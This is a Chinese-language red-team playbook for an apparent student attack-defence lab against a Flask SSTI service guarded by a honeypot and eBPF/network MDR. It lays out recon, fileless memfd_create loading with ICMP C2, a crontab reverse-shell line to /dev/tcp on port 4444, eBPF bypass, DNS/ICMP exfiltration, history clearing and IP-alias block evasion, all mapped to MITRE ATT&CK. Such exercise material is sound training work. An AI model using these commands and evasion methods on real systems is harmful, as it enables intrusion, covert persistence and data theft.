# Red Team Playbook - 紅方操作手冊

## 環境概覽

| 角色 | 位置 | 說明 |
|------|------|------|
| 紅軍攻擊機 | 同學筆電 (WSL2) | 攻擊發起端 |
| 企業靶機 | Lab 機器 | Flask SSTI 漏洞服務 + SSH 蜜罐 |
| 藍軍防禦中心 | Lab 機器 | eBPF MDR + 網路 MDR + SOC Dashboard |

## 目標基礎設施

| 服務 | Port | 說明 | 注意事項 |
|------|------|------|----------|
| Honeypot (假 SSH) | 2222 | 蜜罐陷阱 (`honeypot.py`) | **觸碰即觸發 MDR 封鎖 IP** |
| Diagnostic API (真目標) | 9999 | Flask SSTI 漏洞 (`target_app.py`) | 主要攻擊面 |
| Reverse Shell | 4444 | 紅方 listener 端口 | 回合 5 使用 |

**Target IP:** `<TARGET_IP>` (依實際環境調整)

---

## 攻擊流程 (Kill Chain)

### Phase 1: Reconnaissance (偵察)

```bash
# 執行偵察腳本
bash red_team/recon.sh <TARGET_IP>

# 或手動執行
nmap -p 2000-10000 -sV <TARGET_IP>
```

**掃出來會看到：**
- Port 2222 → SSH banner (蜜罐，不要碰！碰了會被封鎖 IP)
- Port 9999 → Diagnostic API (真正目標，Flask SSTI 漏洞)

### Phase 2: Exploitation — Fileless ICMP C2 (主要攻擊)

用 `red_attacker.py` 做 SSTI 注入 → memfd_create 無檔案載入 → ICMP 隱蔽 C2：

```bash
# 終端 1: 啟動 C2 Server（需要 sudo，因為用 ICMP raw socket）
sudo .venv/bin/python3 red_team/red_attacker.py -t <TARGET_IP> -l <ATTACKER_IP>

# 終端 2: 貼上 C2 輸出的 curl 指令觸發 SSTI
curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=<PAYLOAD>"
```

**攻擊鏈：**
```
SSTI 注入 → os.popen() → base64 -d → python3 loader
  └→ memfd_create (匿名記憶體 fd)
  └→ write(fd, agent_code)
  └→ fork() → execve("/usr/bin/python3", ["/proc/<pid>/fd/<N>"])
  └→ agent 透過 ICMP echo request 回連 C2（AES-256-CTR 加密）
```

**C2 操作（收到 beacon 後）：**
```
C2> whoami
root

C2> id
uid=0(root) gid=0(root)

C2> cat /etc/hostname
target-machine

C2> exit          # 終止 agent
C2> quit          # 退出 C2
```

**技術重點：**

| 技術 | 原理 |
|------|------|
| SSTI | Flask f-string + `render_template_string` → Jinja2 執行 `{{ }}` 中的程式碼 |
| memfd_create | syscall 319，建立匿名 RAM-only fd，不寫入磁碟 |
| ICMP Covert C2 | 資料藏在 ICMP echo request payload，AES-256-CTR 加密 |
| 無檔案執行 | execve 從 `/proc/<pid>/fd/<N>` 執行，無磁碟痕跡 |

### Phase 3: Post-Exploitation (後滲透)

拿到 shell 之後做一些基本情報蒐集：

```
C2> whoami && id
C2> uname -a
C2> cat /etc/passwd
C2> ls -la /home/
```

### Phase 4: Persistence (持久化)

> 注意：以下指令在 C2 shell 中執行（靶機上）

```bash
# 植入 crontab 反向 shell (替換 <WSL2_IP>)
(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/<WSL2_IP>/4444 0>&1'") | crontab -
```

### Phase 5: Evasion — eBPF v1 Bypass (繞過防禦)

**狀況**：藍軍開了 eBPF v1（`blue_ebpf_mdr.py --kill`），memfd_create 攻擊被擋了。
**對策**：改用不走 memfd_create 的 TCP reverse shell。

```bash
# 攻擊機: 啟動 reverse shell listener + payload 產生器（不需要 sudo）
.venv/bin/python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>

# 另一終端: 貼上輸出的 curl 指令
curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=<PAYLOAD>"
```

**繞過原理：**

| eBPF v1 Hook | 我們是否觸發 | 為什麼 |
|--------------|-------------|--------|
| `memfd_create` | [X] 不觸發 | 不用 memfd，直接 fork |
| `execve /proc/fd` | [X] 不觸發 | 不從 /proc/fd 執行 |
| `socket(SOCK_RAW)` | [X] 不觸發 | 用 SOCK_STREAM (TCP) |

**攻擊鏈：**
```
SSTI → os.popen → base64 -d → python3 → fork()
  └→ child: socket(SOCK_STREAM) → connect(ATTACKER_IP:4444)
       → dup2(sock, 0) → dup2(sock, 1) → dup2(sock, 2)
       → pty.spawn("/bin/bash") → interactive shell
```

**注意**：此攻擊不需要 sudo（用 TCP 不用 ICMP raw socket）

### Phase 5b: Exfiltration (資料外傳)

```bash
# 攻擊機: 啟動接收器
sudo .venv/bin/python3 red_team/exfil_listener.py

# 靶機 (C2 shell 或 reverse shell 內): 部署 agent
# 先在攻擊機生成部署指令:
bash red_team/deploy_agent.sh <WSL2_IP>
# 然後將輸出貼到 shell 中執行
```

通道: DNS (主) / ICMP (備用)，自動偵測切換。
外傳完成後 agent 自動刪除。

### Phase 6: Cleanup (清除痕跡)

```bash
history -c
exit
```

---

## IP 切換原理 (繞過網路層 MDR 封鎖)

藍軍的網路 MDR（`blue_mdr_network.py`）會用 iptables DROP 封鎖碰蜜罐的 IP。我們用 IP alias 多掛一個 IP 繞過去。

| IP | 用途 | 結果 |
|----|------|------|
| 172.22.137.14 (主) | 觸發蜜罐 port 2222 | 被 MDR 封鎖 |
| 172.22.137.15 (備用) | 攻擊 port 9999 | 未被封鎖 |

管理指令: `bash red_team/ip_switch.sh add` / `remove` / `status`

> IP alias 只能繞過網路層封鎖。如果藍軍同時有開 eBPF，行為偵測照樣有效（跟 IP 無關）。

---

## MITRE ATT&CK 對應

這邊整理一下我們用到的 MITRE ATT&CK technique，方便報告裡引用。

| 戰術 | 技術 ID | 說明 | 對應階段 |
|------|---------|------|----------|
| Reconnaissance | T1595 | Active Scanning | Phase 1: nmap |
| Initial Access | T1190 | Exploit Public-Facing App | Phase 2: SSTI 注入 |
| Execution | T1059.006 | Python Scripting | memfd loader / reverse shell |
| Defense Evasion | T1620 | Reflective Code Loading | memfd_create → execve /proc/fd |
| Defense Evasion | T1027 | Obfuscation (Base64 + AES-256-CTR) | payload 編碼與加密 |
| Command & Control | T1095 | Non-App Layer Protocol | Phase 2: ICMP C2 + Phase 5: TCP reverse shell |
| Command & Control | T1571 | Non-Standard Port (4444) | Phase 5: reverse shell on port 4444 |
| Persistence | T1053.003 | Cron Job | Phase 4: crontab |
| Discovery | T1082 | System Information Discovery | whoami, uname |
| Collection | T1005 | Data from Local System | exfil_agent 蒐集 |
| Exfiltration | T1048.003 | Over Non-C2 Protocol (DNS/ICMP) | Phase 5b: 隱蔽通道外傳 |
| Defense Evasion | T1070.003 | Clear Command History | Phase 6: history -c |
| Defense Evasion | T1070.004 | File Deletion | exfil_agent 自刪 |

Privilege Escalation 和 Impact 我們沒有做，主要是控制演練的影響範圍。

---

## 工具清單

| 工具 | 檔案 | 用途 |
|------|------|------|
| Nmap | (系統) | 埠掃描與服務探測 |
| Netcat (nc) | (系統) | 蜜罐觸發 / 連線測試 |
| red_attacker.py | `red_team/` | 主攻擊：SSTI → memfd → ICMP C2 (AES-256-CTR) |
| red_reverse_shell.py | `red_team/` | eBPF v1 繞過：TCP 反向 Shell |
| exploit.py | `red_team/` | 舊版 WAF bypass 攻擊（備用） |
| recon.sh | `red_team/` | 自動化偵察腳本 |
| ip_switch.sh | `red_team/` | IP alias 管理（繞過網路 MDR） |
| exfil_agent.py | `red_team/` | 靶機端自動蒐集 + 外傳 agent |
| exfil_listener.py | `red_team/` | 攻擊機端 DNS/ICMP 接收器 |
| deploy_agent.sh | `red_team/` | 一鍵生成 agent 部署指令 |
| post_exploit.sh | `red_team/` | 後滲透情報蒐集腳本 |

---

## 備忘

1. **Port 2222 是蜜罐** — 碰了會被 MDR 封 IP，Demo 的時候先用主 IP 觸發，再用 `ip_switch.sh` 切備用 IP
2. **記得換 IP** — 用之前把 `<TARGET_IP>` 和 `<ATTACKER_IP>` / `<WSL2_IP>` 換成實際的 IP
3. **venv 環境** — Python 工具都用 `.venv/bin/python3` 跑，需要 sudo 的就 `sudo .venv/bin/python3`
4. **純 CLI** — 演練全程不用 GUI 工具
5. **不做提權和破壞** — 控制影響範圍就好
6. **完整 Demo 腳本** — 看 `docs/DEMO_FLOW.md`，有 7 回合的完整流程
7. **收尾** — Demo 完跑 `sudo bash cleanup.sh` 清掉殘留（程序、iptables、log、loot、crontab）
